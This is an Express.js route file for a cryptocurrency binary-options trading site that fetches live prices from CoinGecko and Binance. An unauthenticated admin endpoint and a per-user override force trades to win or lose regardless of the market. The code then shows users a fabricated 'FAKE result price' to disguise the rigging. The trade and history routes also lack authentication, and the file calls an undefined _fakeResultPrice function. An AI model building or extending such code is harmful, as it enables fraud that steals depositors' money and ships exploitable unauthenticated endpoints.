// routes/trade.js — FREE live pricing (CoinGecko + Binance)
require("dotenv").config();
const express = require("express");
const router = express.Router();
const axios = require("axios");
const pool = require("../db");
const { authenticateToken } = require("../middleware/auth"); // keep if used

/* -------------------- Helpers -------------------- */
const ALLOWED_COINS = ["BTC", "ETH", "SOL", "XRP", "TON"];

// Normalize "btc/usdt", "BTCUSDT", "btc-usdt" -> "BTC"
function normalizeSymbol(input) {
  if (!input) return "";
  let s = String(input).trim().toUpperCase().replace(/\s+/g, "");
  if (s.includes("/")) s = s.split("/")[0];
  if (s.includes("-")) s = s.split("-")[0];
  if (s.endsWith("USDT")) s = s.slice(0, -4);
  if (s.endsWith("USD")) s = s.slice(0, -3);
  return s;
}

// "buy"/"sell" -> "BUY"/"SELL"
function normalizeDirection(input) {
  const d = String(input || "").trim().toUpperCase();
  if (d === "BUY" || d === "SELL") return d;
  if (d === "LONG") return "BUY";
  if (d === "SHORT") return "SELL";
  return d.includes("SELL") ? "SELL" : "BUY";
}

// Symbol -> CoinGecko ID
const CG_ID = {
  BTC: "bitcoin",
  ETH: "ethereum",
  SOL: "solana",
  XRP: "ripple",
  TON: "the-open-network",
  USDT: "tether",
};

// live USD price: CoinGecko primary, Binance fallback
async function getSpotUSD(symbol) {
  const sym = symbol.toUpperCase();

  try {
    const id = CG_ID[sym];
    if (id) {
      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`;
      const { data } = await axios.get(url, { timeout: 8000 });
      const price = Number(data?.[id]?.usd);
      if (price) return price;
    }
  } catch {}

  try {
    const url = `https://api.binance.com/api/v3/ticker/price?symbol=${sym}USDT`;
    const { data } = await axios.get(url, { timeout: 8000 });
    const price = Number(data?.price);
    if (price) return price;
  } catch {}

  throw new Error("LIVE_PRICE_UNAVAILABLE");
}

async function getUserTradeMode(user_id) {
  const { rows } = await pool.query("SELECT mode FROM user_trade_modes WHERE user_id = $1", [user_id]);
  return (rows[0] && rows[0].mode) || null;
}
async function getTradeMode() {
  const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'TRADE_MODE'");
  return (rows[0] && rows[0].value) || "AUTO";
}

/* -------------------- Admin: set global trade mode -------------------- */
router.post("/set-trade-mode", async (req, res) => {
  const { mode } = req.body;
  if (!["AUTO", "ALL_WIN", "ALL_LOSE"].includes(mode)) {
    return res.status(400).json({ error: "Invalid trade mode" });
  }
  try {
    await pool.query(
      "INSERT INTO settings (key, value) VALUES ('TRADE_MODE', $1) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value",
      [mode]
    );
    res.json({ success: true, mode });
  } catch {
    res.status(500).json({ error: "Failed to update mode" });
  }
});

/* -------------------- POST /api/trade -------------------- */
router.post("/", async (req, res) => {
  try {
    let { user_id, direction, amount, duration, symbol } = req.body;
    if (!user_id || !direction || !amount || !duration) {
      return res.status(400).json({ error: "Missing trade data" });
    }

    const normSymbol = normalizeSymbol(symbol || "BTC");  // e.g., "BTC"
    const normDirection = normalizeDirection(direction);  // "BUY"/"SELL"

    if (!ALLOWED_COINS.includes(normSymbol)) {
      return res.status(400).json({ error: "Invalid coin symbol" });
    }

    const safeDuration = Math.max(5, Math.min(120, Number(duration)));
    const safeAmount = Math.max(1, Number(amount));

    // Check user and balance
    const userRes = await pool.query("SELECT * FROM users WHERE id = $1", [user_id]);
    const user = userRes.rows[0];
    if (!user) return res.status(404).json({ error: "User not found" });

    const usdtRes = await pool.query(
      "SELECT * FROM user_balances WHERE user_id = $1 AND coin = 'USDT'",
      [user_id]
    );
    const usdt = usdtRes.rows[0];
    if (!usdt || parseFloat(usdt.balance) < safeAmount) {
      return res.status(400).json({ error: "Insufficient USDT" });
    }

    // 1) Real entry price
    let start_price = 0;
    try {
      start_price = await getSpotUSD(normSymbol);
    } catch {
      const fallback = { BTC: 65000, ETH: 3400, SOL: 140, XRP: 0.6, TON: 7.0 };
      start_price = fallback[normSymbol] || 1;
    }

    // 2) Deduct stake
    await pool.query(
      "UPDATE user_balances SET balance = balance - $1 WHERE user_id = $2 AND coin = 'USDT'",
      [safeAmount, user_id]
    );

    // 3) Save pending trade
    const timestamp = new Date().toISOString();
    const insertTradeRes = await pool.query(
      `INSERT INTO trades 
        (user_id, symbol, direction, amount, duration, start_price, result, profit, result_price, timestamp)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
        RETURNING id`,
      [user.id, normSymbol, normDirection, safeAmount, safeDuration, start_price, "PENDING", 0, null, timestamp]
    );
    const trade_id = insertTradeRes.rows[0].id;

// 4) Finish trade after countdown using ADMIN/AUTO mode and FAKE result price
setTimeout(async () => {
  try {
    // mode (user override > global)
    let mode = await getUserTradeMode(user_id);
    if (!mode) mode = await getTradeMode();

    // payout percent by duration (unchanged)
    const minSec = 5, maxSec = 120, minPct = 5, maxPct = 40;
    let percent = minPct + ((safeDuration - minSec) * (maxPct - minPct) / (maxSec - minSec));
    percent = Math.max(minPct, Math.min(maxPct, percent));
    percent = Math.round(percent * 100) / 100;

    // We may still look at the market to decide AUTO result,
    // but we will NOT use it for displayed result_price.
    let end_price_for_decision = start_price;
    try {
      end_price_for_decision = await getSpotUSD(normSymbol);
    } catch {
      /* ignore – fall back to start_price for decision */
    }

    // decide result
    let result;
    if (mode === "WIN" || mode === "ALL_WIN") {
      result = "WIN";
    } else if (mode === "LOSE" || mode === "ALL_LOSE") {
      result = "LOSE";
    } else {
      const wentUp = end_price_for_decision >= start_price;
      const buyWins = normDirection === "BUY" && wentUp;
      const sellWins = normDirection === "SELL" && !wentUp;
      result = (buyWins || sellWins) ? "WIN" : "LOSE";
    }

    // compute profit (binary: win = +amount * percent, loss = -amount)
    let profit = Number((safeAmount * percent / 100).toFixed(2));
    if (result === "LOSE") profit = -safeAmount;

    // FAKE result price consistent with (direction, result) around the real start price
    const result_price = _fakeResultPrice(start_price, normDirection, result, normSymbol);

    // persist settlement
    await pool.query(
      `UPDATE trades SET result = $1, profit = $2, result_price = $3 WHERE id = $4`,
      [result, profit, result_price, trade_id]
    );

    // credit if win: return stake + profit (stake was already deducted at entry)
    if (result === "WIN") {
      await pool.query(
        `UPDATE user_balances SET balance = balance + $1 WHERE user_id = $2 AND coin = 'USDT'`,
        [safeAmount + profit, user_id]
      );
    }

    // snapshot
    const { rows: balRows } = await pool.query(
      "SELECT balance FROM user_balances WHERE user_id = $1 AND coin = 'USDT'",
      [user_id]
    );
    const newBalance = balRows[0] ? parseFloat(balRows[0].balance) : 0;
    await pool.query(
      `INSERT INTO balance_history (user_id, coin, balance, price_usd, timestamp)
       VALUES ($1, $2, $3, $4, NOW())`,
      [user_id, "USDT", newBalance, 1]
    );
  } catch (err) {
    console.error("Trade finish error:", err);
  }
}, safeDuration * 1000);

    res.json({
      status: "pending",
      trade_id,
      start_price,
      symbol: normSymbol,
      direction: normDirection,
      amount: safeAmount,
      duration: safeDuration,
      message: "Trade started! Wait for countdown..."
    });

  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

/* -------------------- History & Admin -------------------- */
router.get("/history/:user_id", async (req, res) => {
  const { user_id } = req.params;
  try {
    const { rows } = await pool.query(
      `SELECT * FROM trades WHERE user_id = $1 ORDER BY timestamp DESC`,
      [user_id]
    );
    res.json(rows);
  } catch {
    res.status(500).json({ error: "DB error" });
  }
});

router.get("/trades", async (_req, res) => {
  try {
    const { rows } = await pool.query(`
      SELECT 
        t.id AS trade_id,
        t.user_id,
        u.username,
        t.direction,
        t.amount,
        t.duration,
        t.result,
        t.profit,
        t.timestamp
      FROM trades t
      LEFT JOIN users u ON t.user_id = u.id
      ORDER BY t.timestamp DESC
    `);
    res.json(rows);
  } catch {
    res.status(500).json({ error: "Failed to fetch trades" });
  }
});

module.exports = router;
